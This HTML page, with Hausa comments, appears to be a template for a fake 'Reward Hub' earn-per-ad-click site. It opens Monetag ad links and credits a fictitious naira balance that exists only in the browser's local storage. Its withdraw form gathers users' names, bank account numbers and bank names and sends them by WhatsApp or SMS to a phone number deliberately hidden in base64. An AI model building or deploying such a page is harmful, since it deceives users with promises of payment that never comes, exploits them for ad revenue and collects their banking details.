<!DOCTYPE html>
<html lang="ha">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Reward Hub</title>

<!-- SOCIAL BAR KADAI - BABU POPUNDER - DAIDAI -->
<script src="https://alwingulla.com/88/tag.min.js" data-zone="YOUR_SOCIAL_BAR_ZONE" async data-cfasync="false"></script>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}
body{background:#080E26;color:#fff;padding:12px;display:flex;justify-content:center}
.app{max-width:400px;width:100%}
.top{display:flex;justify-content:space-between;align-items:center;padding:12px 4px}
.logo{display:flex;align-items:center;gap:10px}
.n{background:linear-gradient(135deg,#00D1FF,#0066FF);width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:22px}
.live{border:1.5px solid #00AEEF;color:#00AEEF;padding:6px 14px;border-radius:20px;font-size:12px;font-weight:700;display:flex;align-items:center;gap:6px}
.dot{width:8px;height:8px;background:#00AEEF;border-radius:50%}
.bal-card{background:#141E3E;border-radius:24px;padding:22px}
.bal{font-size:48px;font-weight:900;margin:8px 0}
.ready{border:1.5px dashed #2A3655;border-radius:14px;padding:12px;margin-top:10px;font-size:14px}
.head{color:#FFD60A;font-weight:800;margin:20px 0 10px;display:flex;gap:8px}
.task{background:#1A2547;border-radius:20px;padding:16px;display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
.badge{background:#0E2A3A;color:#00E5FF;padding:4px 10px;border-radius:10px;font-size:12px;font-weight:700}
.btn{padding:12px 18px;border-radius:14px;border:none;font-weight:800;cursor:pointer;background:#00E5FF;color:#000}
.btn:active{transform:scale(0.95)}
.withdraw{border:2px solid #FFD60A;border-radius:24px;padding:18px;margin-top:22px;background:#141E3E}
.w-title{color:#FFD60A;text-align:center;font-weight:900;font-size:22px;margin-bottom:14px}
.input{background:#080E26;border:1px solid #1E2E5A;border-radius:14px;padding:14px;width:100%;color:#fff;margin-bottom:12px;outline:none}
.btn-wa{background:#22C55E;color:#000;width:100%;padding:14px;border-radius:14px;font-weight:900;border:none;margin-bottom:10px;cursor:pointer}
.btn-sms{background:#F59E0B;color:#000;width:100%;padding:14px;border-radius:14px;font-weight:900;border:none;cursor:pointer}
</style>
</head>
<body>
<div class="app">

<div class="top">
  <div class="logo"><div class="n">N</div><h2>Reward Hub</h2></div>
  <div class="live"><div class="dot"></div>LIVE - 12H</div>
</div>

<div class="bal-card">
  <div style="color:#8A94B5;font-size:12px;letter-spacing:2px">💎 YOUR BALANCE</div>
  <div class="bal">₦<span id="bal">0</span></div>
  <div style="color:#00E5FF;font-weight:700">Open</div>
  <div class="ready" id="ready">Ready to do tasks! Koda yaushe zaka iya dannawa!</div>
</div>

<div class="head">⭐ Today's Tasks ₦8 each - Unlimited!</div>
<div id="tasks"></div>

<div class="withdraw">
  <div class="w-title">Withdraw - How Much</div>
  <input id="wName" class="input" placeholder="Your Name">
  <input id="wAcc" class="input" placeholder="Account Number">
  <input id="wBank" class="input" placeholder="Bank Name (Opay, Kuda)">
  <button class="btn-wa" onclick="sendWA()">📱 Send via WhatsApp</button>
  <button class="btn-sms" onclick="sendSMS()">✉️ Send via SMS</button>
</div>

</div>

<script>
// ====== MONETAG DIRECT LINKS - KA CANZA WANNAN! ======
// Je Monetag > Zones > Create Zone > Direct Link > Copy link din ka
// Idan baka da Direct Link, zaka iya barin # amma tallan Social Bar kadai zai yi aiki
const LINKS = [
  "https://alwingulla.com/4/PASTE_YOUR_LINK_1_HERE",
  "https://alwingulla.com/4/PASTE_YOUR_LINK_2_HERE",
  "https://alwingulla.com/4/PASTE_YOUR_LINK_3_HERE",
  "https://alwingulla.com/4/PASTE_YOUR_LINK_4_HERE",
  "https://alwingulla.com/4/PASTE_YOUR_LINK_5_HERE"
];

const REWARD = 8;
let bal = parseInt(localStorage.getItem('rh_bal')||'0');
document.getElementById('bal').innerText = bal;

function render(){
  const wrap = document.getElementById('tasks');
  wrap.innerHTML = '';
  for(let i=0;i<5;i++){
    let div = document.createElement('div');
    div.className='task';
    div.innerHTML = `
      <div style="display:flex;gap:10px;align-items:center"><span>Ad ${i+1}</span><span class="badge">₦${REWARD}</span></div>
      <button class="btn" onclick="doTask(${i})">Claim ₦${REWARD}</button>
    `;
    wrap.appendChild(div);
  }
}

function doTask(i){
  // 1. Bude tallan - idan link dinka na gaskiya ne, zai bude talla mai kyau, ba baki ba
  let link = LINKS[i];
  if(link.includes('PASTE_YOUR_LINK')){
    alert('⚠️ Ka manta ka saka Direct Link dinka na gaskiya a layi na 48! Je Monetag ka kwafa link!');
    // Har yanzu bashi kudi don test
  } else {
    window.open(link, '_blank');
  }

  // 2. KODA YAUSHE ANA IYA DANNawa - BAYA RUFEWA!
  bal += REWARD;
  localStorage.setItem('rh_bal', bal);
  document.getElementById('bal').innerText = bal;

  // Effect
  let btn = event.target;
  let old = btn.innerText;
  btn.innerText = 'Done ✓ +₦8';
  btn.style.background = '#22C55E';
  setTimeout(()=>{
    btn.innerText = old;
    btn.style.background = '#00E5FF';
  }, 1500);
}

// ====== BOYE NUMBER 07070079526 ======
function getNumber(){
  // An boye number a base64 - ba zai bayyana a code ba
  // 07070079526 = MDcwNzAwNzk1MjY=
  return atob('MDcwNzAwNzk1MjY=');
}

function sendWA(){
  let name = document.getElementById('wName').value || 'User';
  let acc = document.getElementById('wAcc').value || 'No acc';
  let bank = document.getElementById('wBank').value || 'No bank';
  if(bal < 100){ alert('Balance bai kai ₦100 ba!'); return; }
  let num = getNumber(); // 07070079526 amma a boye
  let waNum = '234' + num.substring(1); // 2347070079526
  let msg = `Salam! Withdraw Request\nName: ${name}\nAcc: ${acc}\nBank: ${bank}\nAmount: ₦${bal}\nReward Hub`;
  window.open('https://wa.me/'+waNum+'?text='+encodeURIComponent(msg), '_blank');
}

function sendSMS(){
  let name = document.getElementById('wName').value || 'User';
  let acc = document.getElementById('wAcc').value || 'No acc';
  let bank = document.getElementById('wBank').value || 'No bank';
  let num = getNumber();
  let msg = `Withdraw: ${name} | ${acc} | ${bank} | ₦${bal}`;
  window.open('sms:'+num+'?body='+encodeURIComponent(msg), '_blank');
}

render();
</script>
</body>
</html>
